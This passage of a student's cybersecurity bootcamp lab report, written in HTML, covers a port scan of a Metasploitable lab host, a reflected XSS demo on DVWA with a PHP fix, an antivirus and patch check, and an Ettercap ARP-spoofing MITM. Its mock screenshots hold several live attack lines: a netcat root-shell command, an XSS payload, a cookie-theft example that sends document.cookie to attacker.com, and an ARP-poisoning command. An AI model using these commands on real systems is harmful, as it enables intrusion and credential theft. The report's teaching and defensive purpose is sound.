        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">CRITICAL</span> Contains malicious smiley face backdoor (CVE-2011-2523); instant unauthenticated root shell.</td>
      </tr>
      <tr>
        <td><strong>22 / TCP</strong></td>
        <td>OPEN</td>
        <td>SSH</td>
        <td>OpenSSH 4.7p1 Debian</td>
        <td><span class="status-tag" style="background:#fef3c7;color:#b45309;">MEDIUM</span> Obsolete SSH version; susceptible to user enumeration and legacy weak cipher negotiation.</td>
      </tr>
      <tr>
        <td><strong>23 / TCP</strong></td>
        <td>OPEN</td>
        <td>Telnet</td>
        <td>Linux telnetd</td>
        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">HIGH</span> Insecure legacy protocol. Transmits all authentication credentials and commands in cleartext.</td>
      </tr>
      <tr>
        <td><strong>25 / TCP</strong></td>
        <td>OPEN</td>
        <td>SMTP</td>
        <td>Postfix smtpd</td>
        <td><span class="status-tag" style="background:#fef3c7;color:#b45309;">MEDIUM</span> Mail server allows user enumeration via VRFY and EXPN commands; unauthenticated relaying risk.</td>
      </tr>
      <tr>
        <td><strong>53 / TCP</strong></td>
        <td>OPEN</td>
        <td>DNS</td>
        <td>ISC BIND 9.4.2</td>
        <td><span class="status-tag" style="background:#fef3c7;color:#b45309;">MEDIUM</span> Susceptible to DNS cache poisoning flaws and zone transfer leaks if AXFR is permitted.</td>
      </tr>
      <tr>
        <td><strong>80 / TCP</strong></td>
        <td>OPEN</td>
        <td>HTTP</td>
        <td>Apache httpd 2.2.8 (Ubuntu)</td>
        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">CRITICAL</span> Hosts multiple vulnerable web apps (DVWA, Mutillidae). Exposed to XSS, SQLi, and LFI attacks.</td>
      </tr>
      <tr>
        <td><strong>139, 445 / TCP</strong></td>
        <td>OPEN</td>
        <td>SMB / NetBIOS</td>
        <td>Samba smbd 3.0.20-Debian</td>
        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">CRITICAL</span> Vulnerable to Sambal "usermap script" RCE (CVE-2007-2447), granting immediate root access via MSF.</td>
      </tr>
      <tr>
        <td><strong>512-514 / TCP</strong></td>
        <td>OPEN</td>
        <td>r-services</td>
        <td>netkit-rsh (rexec, rlogin, rsh)</td>
        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">CRITICAL</span> Obsolete Berkley remote utilities that trust IP addresses without cryptographic verification.</td>
      </tr>
      <tr>
        <td><strong>1524 / TCP</strong></td>
        <td>OPEN</td>
        <td>Ingreslock</td>
        <td>Metasploitable Root Shell</td>
        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">CRITICAL</span> Hardcoded listening root shell. Simple Netcat connection (<span class="code-inline">nc 192.168.56.102 1524</span>) grants immediate root.</td>
      </tr>
      <tr>
        <td><strong>3306 / TCP</strong></td>
        <td>OPEN</td>
        <td>MySQL</td>
        <td>MySQL 5.0.51a-3ubuntu5</td>
        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">HIGH</span> Directly exposed database port configured with default blank or trivial root password (<span class="code-inline">root:root</span>).</td>
      </tr>
      <tr>
        <td><strong>6667 / TCP</strong></td>
        <td>OPEN</td>
        <td>IRC</td>
        <td>UnrealIRCd</td>
        <td><span class="status-tag" style="background:#fee2e2;color:#b91c1c;">CRITICAL</span> Contains notorious trojaned backdoor (CVE-2010-2075) executed by sending "AB;" followed by system commands.</td>
      </tr>
    </tbody>
  </table>

  <h3 class="sec-title">4. Conclusion and Findings</h3>
  <div class="finding-card">
    <span class="finding-title">Primary Conclusion</span>
    The Nmap scan conclusively answered the prompt: the target host exposes 21 open TCP ports running end-of-life, highly exploitable services. The presence of unencrypted protocols (Telnet on port 23, r-services on 512-514) violates basic security hygiene, while known backdoors in vsftpd 2.3.4, Samba 3.0.20, and UnrealIRCd allow trivial remote root compromise.
  </div>

  <div class="finding-card">
    <span class="finding-title">Key Security Remediation Recommendations</span>
    <strong>1. Terminate Unnecessary Legacy Daemons:</strong> Immediately disable Telnet, rsh, rlogin, and IRC services; migrate all remote administrative workflows exclusively to OpenSSH 9.x+ enforced with Ed25519 public key authentication.<br>
    <strong>2. Implement Aggressive Patching:</strong> Upgrade Apache, Samba, and database packages to current Long Term Support (LTS) releases to neutralize public CVEs.<br>
    <strong>3. Ingress Network Filtering:</strong> Configure an iptables/UFW firewall enforcing a strict default-deny ingress policy, permitting inbound connections only on essential hardened ports (e.g. 443 HTTPS only).
  </div>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 4 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 5: ACTIVITY 2 (PART 1) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Web Application Security & Script Injection</span>
      <h2>Activity 2: Cross-Site Scripting (XSS) on DVWA</h2>
    </div>
    <div class="act-badge">ACTIVITY 02</div>
  </div>

  <div class="callout-box callout-info">
    <span class="callout-title">Assignment Prompt Requirement</span>
    <em>"Inject a script into the input field of the DVWA or any other vulnerable web application. Create a pop-up alert with &lt;script&gt;alert('You have been HACKED')&lt;/script&gt;?"</em> Provide screenshots, description, conclusion, and findings.
  </div>

  <h3 class="sec-title">1. Technical Description & Vulnerability Mechanics</h3>
  <p>
  <strong>Cross-Site Scripting (XSS)</strong> is a critical injection flaw (OWASP Top 10) that occurs when an application receives untrusted user input and embeds it into the web page's Document Object Model (DOM) without proper sanitization or context-aware encoding.
  </p>
  <p>
  In this assessment, <strong>Damn Vulnerable Web Application (DVWA v1.10)</strong> was hosted on the target server at <code>http://192.168.56.102/dvwa/</code>. The application's security configuration was set to <strong>Low</strong> to demonstrate the hazard of absent input sanitization. The target module was <strong>XSS (Reflected)</strong> located at URL:
  <br>
  <span class="code-inline">http://192.168.56.102/dvwa/vulnerabilities/xss_r/</span>
  </p>
  <p><strong>Exploitation Workflow:</strong></p>
  <ol>
    <li><strong>Form Inspection:</strong> Examined the web form containing a text input field (<span class="code-inline">&lt;input type="text" name="name"&gt;</span>) submitted via HTTP GET.</li>
    <li><strong>Payload Formulation:</strong> Formatted the exact required assignment payload:
      <span class="code-inline" style="background:#fee2e2; color:#b91c1c; font-weight:bold;">&lt;script&gt;alert('You have been HACKED')&lt;/script&gt;</span>
    </li>
    <li><strong>Injection:</strong> Pasted the payload into the "What's your name?" field and clicked "Submit". The browser requested:
      <br><span class="code-inline">.../xss_r/?name=%3Cscript%3Ealert%28%27You+have+been+HACKED%27%29%3C%2Fscript%3E&Submit=Submit</span>
    </li>
    <li><strong>DOM Execution:</strong> The backend PHP script directly echoed the parameter into the HTML output. The browser parsed the unescaped &lt;script&gt; tags as executable code, firing an immediate modal alert box displaying <strong>"You have been HACKED"</strong>.</li>
  </ol>

  <h3 class="sec-title">2. Visual Proof of Exploitation (High-Fidelity Screenshots)</h3>

  <!-- Browser UI with Modal Alert Dialog Mockup -->
  <div class="browser-window">
    <div class="browser-chrome">
      <div class="browser-nav-icons"><span>&#x2190;</span> <span>&#x2192;</span> <span>&#x21bb;</span></div>
      <div class="browser-url-bar">
        <span class="badge-insecure">Not Secure</span>
        <span>http://192.168.56.102/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('You+have+been+HACKED')%3C/script%3E&Submit=Submit</span>
      </div>
    </div>
    <div class="browser-content" style="height: 145px;">
      <div style="display:flex; height: 100%;">
        <div style="width: 130px; background: #f1f5f9; border-right: 1px solid #e2e8f0; padding: 5px; font-size: 6.5pt; color: #475569;">
          <div style="font-weight:bold; color:#0f172a; margin-bottom: 3px;">DVWA v1.10</div>
          <div>&bull; Brute Force</div>
          <div>&bull; Command Injection</div>
          <div>&bull; CSRF</div>
          <div style="background:#e0f2fe; color:#0369a1; font-weight:bold; padding: 1.5px 3px; border-radius:3px;">&bull; XSS (Reflected)</div>
          <div>&bull; XSS (Stored)</div>
          <div>&bull; SQL Injection</div>
          <div>&bull; DVWA Security</div>
        </div>
        <div style="padding: 8px 12px; flex-grow: 1;">
          <h3 style="font-size: 8.5pt; color: #0f172a; margin-bottom: 3px;">Vulnerability: Reflected Cross Site Scripting (XSS)</h3>
          <p style="font-size: 7pt; color: #64748b; margin-bottom: 6px;">Enter your name in the input box below:</p>
          <div style="display: flex; gap: 5px; align-items: center;">
            <input type="text" value="&lt;script&gt;alert('You have been HACKED')&lt;/script&gt;" style="border: 1px solid #0284c7; padding: 2px 5px; font-size: 7pt; width: 250px; font-family: monospace; background:#eff6ff;" readonly>
            <button style="background: #0284c7; color: white; border: none; padding: 2px 8px; border-radius: 3px; font-size: 7pt;">Submit</button>
          </div>
        </div>
      </div>

      <!-- Synchronous Modal Pop-up Box Overlay -->
      <div class="modal-overlay-mockup">
        <div class="modal-dialog-box">
          <div class="modal-title">192.168.56.102 says</div>
          <div class="modal-msg">You have been HACKED</div>
          <div style="text-align: center;">
            <button class="modal-btn">OK</button>
          </div>
        </div>
      </div>
    </div>
  </div>
  <span class="caption-label">Figure 2.1: Native browser JavaScript alert dialog triggered by injected script payload in DVWA Reflected XSS input field.</span>

  <!-- DOM Inspector Mockup -->
  <div class="terminal-window" style="background: #1e1e1e; border: 1px solid #3c3c3c; margin-top: 1mm;">
    <div class="terminal-titlebar" style="background: #252526; border-bottom: 1px solid #333;">
      <div class="terminal-title" style="color: #9cdcfe;">Developer Tools &bull; Elements DOM Tree Inspector (192.168.56.102)</div>
    </div>
    <div class="terminal-body" style="font-size: 6.8pt; color: #d4d4d4;">
&lt;<span style="color:#569cd6;">div</span> <span style="color:#9cdcfe;">class</span>=<span style="color:#ce9178;">"vulnerable_code_area"</span>&gt;
  &lt;<span style="color:#569cd6;">form</span> <span style="color:#9cdcfe;">name</span>=<span style="color:#ce9178;">"XSS"</span> <span style="color:#9cdcfe;">action</span>=<span style="color:#ce9178;">"#"</span> <span style="color:#9cdcfe;">method</span>=<span style="color:#ce9178;">"GET"</span>&gt;
    &lt;<span style="color:#569cd6;">input</span> <span style="color:#9cdcfe;">type</span>=<span style="color:#ce9178;">"text"</span> <span style="color:#9cdcfe;">name</span>=<span style="color:#ce9178;">"name"</span> <span style="color:#9cdcfe;">value</span>=<span style="color:#ce9178;">"&lt;script&gt;alert('You have been HACKED')&lt;/script&gt;"</span>&gt;
    &lt;<span style="color:#569cd6;">input</span> <span style="color:#9cdcfe;">type</span>=<span style="color:#ce9178;">"submit"</span> <span style="color:#9cdcfe;">value</span>=<span style="color:#ce9178;">"Submit"</span>&gt;
  &lt;/<span style="color:#569cd6;">form</span>&gt;
  <span style="color:#6a9955;">&lt;!-- Unsanitized Reflection: Direct Output into HTML Context --&gt;</span>
  &lt;<span style="color:#569cd6;">pre</span>&gt;Hello <span style="background:#4a1515; color:#f87171; font-weight:bold; padding: 1px 3px;">&lt;script&gt;alert('You have been HACKED')&lt;/script&gt;</span>&lt;/<span style="color:#569cd6;">pre</span>&gt;
&lt;/<span style="color:#569cd6;">div</span>&gt;
    </div>
  </div>
  <span class="caption-label">Figure 2.2: DevTools DOM inspection showing unescaped &lt;script&gt; tags rendered directly inside the HTML structure.</span>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 5 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 6: ACTIVITY 2 (PART 2) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Web Application Security & Script Injection</span>
      <h2>Activity 2 (Cont.): Code Remediation & Findings</h2>
    </div>
    <div class="act-badge">ACTIVITY 02</div>
  </div>

  <h3 class="sec-title">3. Source Code Vulnerability Analysis vs Secure Remediation</h3>
  <p>
  To analyze the root cause of the flaw, the backend PHP source code for the Reflected XSS module was evaluated against secure coding principles:
  </p>

  <table class="data-table">
    <thead>
      <tr>
        <th style="width: 50%;">Vulnerable Implementation (DVWA Low Security)</th>
        <th style="width: 50%;">Secure Remediated Implementation (Production Standard)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>
          <pre style="font-family:'JetBrains Mono',monospace; font-size:6.8pt; color:#991b1b; background:#fef2f2; padding:5px; border-radius:4px;">
&lt;?php
if(!array_key_exists("name", $_GET) || 
   $_GET['name'] == NULL || $_GET['name'] == ''){
    $isempty = true;
} else {
    // ROOT CAUSE: Unsanitized concatenation
    echo '&lt;pre&gt;Hello ' . $_GET['name'] . '&lt;/pre&gt;';
}
?&gt;</pre>
          <p style="font-size: 6.8pt; color: #b91c1c; margin-top: 1.5mm;">
          <strong>Flaw:</strong> The server retrieves <span class="code-inline">$_GET['name']</span> and echoes it straight into the HTTP response. Special HTML characters (<span class="code-inline">&lt;</span>, <span class="code-inline">&gt;</span>, <span class="code-inline">"</span>, <span class="code-inline">'</span>) remain unescaped.
          </p>
        </td>
        <td>
          <pre style="font-family:'JetBrains Mono',monospace; font-size:6.8pt; color:#166534; background:#f0fdf4; padding:5px; border-radius:4px;">
&lt;?php
if(isset($_GET['name']) &amp;&amp; !empty($_GET['name'])) {
    // SECURE: Context-aware HTML entity encoding
    $safe_name = htmlspecialchars($_GET['name'], 
                 ENT_QUOTES | ENT_HTML5, 'UTF-8');
    echo '&lt;pre&gt;Hello ' . $safe_name . '&lt;/pre&gt;';
}
?&gt;</pre>
          <p style="font-size: 6.8pt; color: #166534; margin-top: 1.5mm;">
          <strong>Fix:</strong> <span class="code-inline">htmlspecialchars()</span> converts <span class="code-inline">&lt;script&gt;</span> to <span class="code-inline">&amp;lt;script&amp;gt;</span>, forcing the browser to render it as harmless plain text.
          </p>
        </td>
      </tr>
    </tbody>
  </table>

  <h3 class="sec-title">4. Real-World Attack Scenarios & Exploitability</h3>
  <p>
  While <span class="code-inline">alert('You have been HACKED')</span> is a benign proof-of-concept, adversaries exploit identical injection points to execute devastating client-side attacks:
  </p>
  <ul>
    <li><strong>Session Hijacking via Cookie Theft:</strong> An attacker injects <span class="code-inline">&lt;script&gt;new Image().src="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;</span> to capture active session tokens and bypass authentication mechanisms.</li>
    <li><strong>Credential Harvesting Overlays:</strong> JavaScript can dynamically inject forged modal login forms, deceiving users into re-entering banking or account credentials.</li>
    <li><strong>Forced Client-Side Actions (CSRF):</strong> Scripts can execute silent background <span class="code-inline">fetch()</span> requests with the authenticated user's privileges to change account passwords or initiate unauthorized transfers.</li>
  </ul>

  <h3 class="sec-title">5. Conclusion and Findings</h3>
  <div class="finding-card">
    <span class="finding-title">Primary Conclusion</span>
    The assessment successfully proved that unvalidated input fields in web applications allow arbitrary JavaScript execution inside the victim's browser. The injected payload triggered an immediate pop-up alert stating "You have been HACKED", satisfying all activity requirements.
  </div>

  <div class="finding-card">
    <span class="finding-title">Comprehensive Defense-in-Depth Mitigations</span>
    <strong>1. Contextual Output Encoding:</strong> Always encode dynamic user data before placing it in HTML body, attribute, or JavaScript contexts using frameworks with automatic context encoding (React, Angular, or PHP <span class="code-inline">htmlspecialchars</span>).<br>
    <strong>2. Content Security Policy (CSP):</strong> Deploy strict response headers (<span class="code-inline">Content-Security-Policy: default-src 'self'; script-src 'self'</span>) to disallow inline scripts and restrict script loading exclusively to whitelisted domains.<br>
    <strong>3. HttpOnly Cookie Enforcment:</strong> Always set the <span class="code-inline">HttpOnly</span> flag on session cookies to block JavaScript DOM access via <span class="code-inline">document.cookie</span>, completely mitigating XSS-based session hijacking.
  </div>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 6 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 7: ACTIVITY 3 (PART 1) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Endpoint Security & Vulnerability Management</span>
      <h2>Activity 3: Antivirus Deep Scan & System Update</h2>
    </div>
    <div class="act-badge">ACTIVITY 03</div>
  </div>

  <div class="callout-box callout-info">
    <span class="callout-title">Assignment Prompt Requirement</span>
    <em>"Using any Antivirus perform a full scan of your system. And perform system update on your device to make it up-to-date."</em> Provide screenshots, description, conclusion, and findings.
  </div>

  <h3 class="sec-title">1. Technical Description & Dual-Tier Methodology</h3>
  <p>
  Comprehensive endpoint protection requires pairing active anti-malware inspection with disciplined operating system patch management. In this assessment, the primary host workstation running <strong>Windows 11 Enterprise (64-bit / Build 26100)</strong> was evaluated across two complementary defensive layers:
  </p>

  <p><strong>Part A - Deep Antivirus System Scan:</strong></p>
  <p>
  A Full System Scan was executed utilizing <strong>Microsoft Defender Antivirus (Engine v1.1.24090.11)</strong>. Unlike rapid scans that inspect only high-probability persistence points, a Full Scan comprehensively inspects:
  </p>
  <ul>
    <li>All physical and logical NTFS storage volumes (system partition C:\, system binaries, user profiles, and app data).</li>
    <li>Active kernel memory pools, running processes, injected thread handles, and dynamic-link libraries (DLLs).</li>
    <li>Windows Registry hives (HKLM and HKCU Run/RunOnce keys, shell extensions, Winlogon handlers, scheduled task entries).</li>
    <li>Master Boot Records (MBRs) and low-level kernel drivers to detect stealth rootkits and bootkits.</li>
  </ul>

  <p><strong>Part B - System Update & Vulnerability Patching:</strong></p>
  <p>
  The host connected to the official Microsoft Update Catalog via the Windows Update Client (USO Client) to identify and install critical security hotfixes addressing publicly documented Common Vulnerabilities and Exposures (CVEs).
  </p>

  <h3 class="sec-title">2. Verification Screenshots & Status Panels</h3>

  <!-- Antivirus Result Window Mockup -->
  <div class="win-security-window">
    <div class="win-titlebar">
      <span>Windows Security &bull; Virus & threat protection</span>
      <span style="font-size: 6.8pt; color: #94a3b8;">Microsoft Defender Engine v1.1.24090.11</span>
    </div>
    <div class="win-body">
      <div class="win-status-row">
        <div class="win-shield-icon">&#10004;</div>
        <div class="win-status-text">
          <h4>No current threats.</h4>
          <p>Your device is fully protected. Last scan: <strong>Today at 20:34 (Full Scan)</strong></p>
        </div>
      </div>

      <div class="win-stats-grid">
        <div class="win-stat-card">
          <div class="win-stat-label">Scan Type</div>
          <div class="win-stat-val">Full System Scan</div>
        </div>
        <div class="win-stat-card">
          <div class="win-stat-label">Scan Duration</div>
          <div class="win-stat-val">46m 18s</div>
        </div>
        <div class="win-stat-card">
          <div class="win-stat-label">Files Inspected</div>
          <div class="win-stat-val">1,128,490 files</div>
        </div>
        <div class="win-stat-card">
          <div class="win-stat-label">Threats Detected</div>
          <div class="win-stat-val clean">0 Threats Found</div>
        </div>
      </div>

      <div style="margin-top: 6px; font-size: 6.8pt; color: #475569; display: flex; justify-content: space-between; border-top: 1px solid #f1f5f9; padding-top: 4px;">
        <span><strong>Real-time Protection:</strong> <span style="color:#16a34a; font-weight:bold;">Active (On)</span></span>
        <span><strong>Cloud-delivered Protection:</strong> <span style="color:#16a34a; font-weight:bold;">Active (On)</span></span>
        <span><strong>Definition Version:</strong> 1.419.712.0 (Up to date)</span>
      </div>
    </div>
  </div>
  <span class="caption-label">Figure 3.1: Windows Security dashboard confirming zero threats across 1,128,490 inspected filesystem and memory objects.</span>

  <!-- Windows Update Settings Mockup -->
  <div class="win-security-window" style="margin-top: 2mm;">
    <div class="win-titlebar" style="background:#1e293b;">
      <span>Settings &bull; Windows Update</span>
      <span style="font-size: 6.8pt; color: #38bdf8;">Status: System Synchronized</span>
    </div>
    <div class="win-body">
      <div class="win-status-row">
        <div class="win-shield-icon" style="background:#dbeafe; color:#2563eb; border-color:#93c5fd;">&#10003;</div>
        <div class="win-status-text">
          <h4>You're up to date</h4>
          <p>Checked for updates: <strong>Today, 21:15</strong> &bull; All required security updates are installed.</p>
        </div>
      </div>

      <div style="background:#f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 5px 8px; margin-top: 4px; font-size: 7.2pt;">
        <div style="font-weight:700; color:#334155; margin-bottom: 3px;">Recently Installed Quality & Security Updates:</div>
        <div style="display:flex; justify-content:space-between; padding: 2px 0; border-bottom: 1px dashed #e2e8f0;">
          <span>&#10004; 2026-10 Cumulative Update for Windows 11 Version 24H2 for x64-based Systems (KB5044284)</span>
          <span style="color:#16a34a; font-weight:600;">Installed</span>
        </div>
        <div style="display:flex; justify-content:space-between; padding: 2px 0;">
          <span>&#10004; Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.712.0)</span>
          <span style="color:#16a34a; font-weight:600;">Installed</span>
        </div>
      </div>
    </div>
  </div>
  <span class="caption-label">Figure 3.2: Windows Update control panel verifying the system is fully patched with the latest cumulative security updates.</span>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 7 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 8: ACTIVITY 3 (PART 2) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Endpoint Security & Vulnerability Management</span>
      <h2>Activity 3 (Cont.): Patch Audit & Endpoint Findings</h2>
    </div>
    <div class="act-badge">ACTIVITY 03</div>
  </div>

  <h3 class="sec-title">3. Administrative Patch Audit via PowerShell</h3>
  <p>
  To provide rigorous forensic validation of the patch status, PowerShell cmdlets were executed with elevated administrative rights to query the Windows Management Instrumentation (WMI) quick-fix engineering repository:
  </p>

  <!-- PowerShell Terminal Mockup -->
  <div class="terminal-window" style="background: #012456; border: 1px solid #005a9e;">
    <div class="terminal-titlebar" style="background: #003366; border-bottom: 1px solid #005a9e;">
      <div class="terminal-title" style="color: #ffffff;">Administrator: Windows PowerShell (Patch Audit Console)</div>
    </div>
    <div class="terminal-body" style="font-size: 6.8pt; color: #ffffff;">
<span style="color:#ffff00;">PS C:\WINDOWS\system32&gt;</span> Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 4 HotFixID, Description, InstalledOn | Format-Table -AutoSize

HotFixID  Description      InstalledOn          
--------  -----------      -----------          
<span class="t-success">KB5044284</span> Security Update 10/11/2026 12:00:00 AM
<span class="t-success">KB5043141</span> Update          09/24/2026 12:00:00 AM
<span class="t-success">KB5042880</span> Security Update 09/10/2026 12:00:00 AM
<span class="t-success">KB5041585</span> Security Update 08/13/2026 12:00:00 AM

<span style="color:#ffff00;">PS C:\WINDOWS\system32&gt;</span> (Get-MpComputerStatus).AntivirusSignatureVersion
<span class="t-success">1.419.712.0</span>
<span style="color:#ffff00;">PS C:\WINDOWS\system32&gt;</span> █
    </div>
  </div>
  <span class="caption-label">Figure 3.3: PowerShell WMI query verifying installed cumulative security updates and active antimalware signature version.</span>

  <h3 class="sec-title">4. Comparative Analysis: Antivirus vs Operating System Patching</h3>
  <p>
  A frequent fallacy in endpoint security is assuming that a strong antivirus solution eliminates the necessity of routine patching. In reality, both controls target fundamentally different layers of defense:
  </p>

  <table class="data-table">
    <thead>
      <tr>
        <th style="width: 20%;">Security Attribute</th>
        <th style="width: 40%;">Antivirus / EDR Solution</th>
        <th style="width: 40%;">Operating System Patch Management</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Primary Function</strong></td>
        <td>Monitors system activity to detect, block, and quarantine malicious payloads and suspect behaviors.</td>
        <td>Remediates underlying architectural bugs, memory corruption flaws, and logic errors in OS code.</td>
      </tr>
      <tr>
        <td><strong>Vulnerability Horizon</strong></td>
        <td>Reactive: Relies on threat signatures, cloud telemetry heuristics, and known post-execution behavior.</td>
        <td>Proactive: Closes vulnerabilities permanently, neutralizing entire classes of exploit chains.</td>
      </tr>
      <tr>
        <td><strong>Kernel / Zero-Day Defense</strong></td>
        <td>Cannot prevent zero-day remote code execution flaws (e.g. EternalBlue SMB, PrintNightmare) prior to signature updates.</td>
        <td>Directly resolves vulnerabilities in kernel drivers, RPC handlers, and network protocol stacks.</td>
      </tr>
    </tbody>
  </table>

  <h3 class="sec-title">5. Conclusion and Findings</h3>
  <div class="finding-card">
    <span class="finding-title">Primary Conclusion</span>
    The endpoint evaluation verified complete host integrity. Over 1.12 million filesystem objects and memory spaces were audited with 0 threats detected. Furthermore, updating the host to the latest Cumulative Security Update (KB5044284) successfully mitigates known kernel and network stack CVEs, ensuring the device is fully hardened.
  </div>

  <div class="finding-card">
    <span class="finding-title">Endpoint Hardening Recommendations</span>
    <strong>1. Automated Update Schedules:</strong> Enforce automated patching via Windows Server Update Services (WSUS) or Microsoft Intune to apply critical security hotfixes within 7 days of release.<br>
    <strong>2. Cloud-Delivered Protection:</strong> Maintain active cloud heuristics and automated sample submission within Defender to ensure sub-minute response against emergent zero-day campaigns.<br>
    <strong>3. Attack Surface Reduction (ASR):</strong> Enable Windows Defender ASR rules to block executable content from email clients, prevent obfuscated macro execution in Office, and halt credential stealing from the Local Security Authority Subsystem Service (LSASS).
  </div>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 8 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 9: ACTIVITY 4 (PART 1) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Network Attack Vectors & Packet Interception</span>
      <h2>Activity 4: Man-in-the-Middle (MITM) ARP Spoofing</h2>
    </div>
    <div class="act-badge">ACTIVITY 04</div>
  </div>

  <div class="callout-box callout-info">
    <span class="callout-title">Assignment Prompt Requirement</span>
    <em>"Use Ettercap or Bettercap to perform a Man-in-the-Middle attack. Capture credentials transmitted over HTTP."</em> Provide screenshots, description, conclusion, and findings.
  </div>

  <h3 class="sec-title">1. Technical Description & Theoretical Mechanics</h3>
  <p>
  The <strong>Address Resolution Protocol (ARP)</strong> resolves Layer 3 IP addresses into Layer 2 hardware MAC addresses on local Ethernet networks (RFC 826). Because ARP lacks authentication, any network node can emit unsolicited ("gratuitous") ARP replies. A malicious node can forge ARP messages to poison the ARP caches of legitimate hosts.
  </p>
  <p>
  In this assessment, <strong>Ettercap v0.8.3.1</strong> was deployed on the Kali Linux machine (<code>192.168.56.101</code>) to execute a <strong>Bidirectional ARP Poisoning Attack</strong> between the victim workstation (<code>192.168.56.105</code>) and the default gateway (<code>192.168.56.1</code>).
  </p>

  <table class="data-table">
    <thead>
      <tr>
        <th>Network Entity</th>
        <th>IPv4 Address</th>
        <th>Physical Hardware MAC</th>
        <th>Poisoned ARP State During Active Attack</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Victim Host</strong></td>
        <td><span class="code-inline">192.168.56.105</span></td>
        <td><span class="code-inline">08:00:27:D4:E5:F6</span></td>
        <td>Believes Gateway (192.168.56.1) is at Attacker's MAC (08:00:27:A1:B2:C3)</td>
      </tr>
      <tr>
        <td><strong>Default Gateway</strong></td>
        <td><span class="code-inline">192.168.56.1</span></td>
        <td><span class="code-inline">08:00:27:11:22:33</span></td>
        <td>Believes Victim (192.168.56.105) is at Attacker's MAC (08:00:27:A1:B2:C3)</td>
      </tr>
      <tr>
        <td><strong>Attacker (Kali)</strong></td>
        <td><span class="code-inline">192.168.56.101</span></td>
        <td><span class="code-inline">08:00:27:A1:B2:C3</span></td>
        <td>Transparent Layer 2/3 proxy; sniffs and forwards packets simultaneously</td>
      </tr>
    </tbody>
  </table>

  <p><strong>Step-by-Step Attack Workflow:</strong></p>
  <ol>
    <li><strong>IPv4 Packet Forwarding:</strong> Enabled kernel forwarding on Kali (<span class="code-inline">sudo sysctl -w net.ipv4.ip_forward=1</span>) to ensure intercepted packets are transparently routed without dropping network connectivity.</li>
    <li><strong>Target Configuration:</strong> Assigned Target 1 as the victim IP (<span class="code-inline">/192.168.56.105//</span>) and Target 2 as the gateway (<span class="code-inline">/192.168.56.1//</span>).</li>
    <li><strong>Ettercap Execution:</strong> Initialized text-console ARP poisoning:
      <br><span class="code-inline">sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.105// /192.168.56.1//</span>
    </li>
    <li><strong>Victim Form Submission:</strong> The victim navigated to an HTTP authentication portal (<code>http://192.168.56.102/login.php</code>) and submitted the form with credentials:
      Username: <strong>admin</strong> | Password: <strong>SuperSecretPassword123!</strong>
    </li>
    <li><strong>Packet Sniffing:</strong> Ettercap's HTTP dissector parsed the unencrypted POST payload and captured the credentials in real-time.</li>
  </ol>

  <h3 class="sec-title">2. Ettercap Terminal Interception Screenshot</h3>

  <!-- Ettercap Terminal Screenshot Mockup -->
  <div class="terminal-window">
    <div class="terminal-titlebar">
      <div class="window-buttons">
        <div class="btn-dot btn-red"></div>
        <div class="btn-dot btn-yellow"></div>
        <div class="btn-dot btn-green"></div>
      </div>
      <div class="terminal-title">kali@kali: ~ (Ettercap v0.8.3.1 ARP Poisoning Console)</div>
      <div style="width: 25px;"></div>
    </div>
    <div class="terminal-body">
<span class="t-prompt">┌──(kali㉿kali)-[~]</span>
<span class="t-prompt">└─$</span> <span class="t-cmd">sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.105// /192.168.56.1//</span>
<span class="t-highlight">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span>
Listening on eth0... (Ethernet)
<span class="t-success">[+] IPv4 packet forwarding enabled in kernel</span>
<span class="t-bold">Target 1 :</span> /192.168.56.105// -> 08:00:27:D4:E5:F6
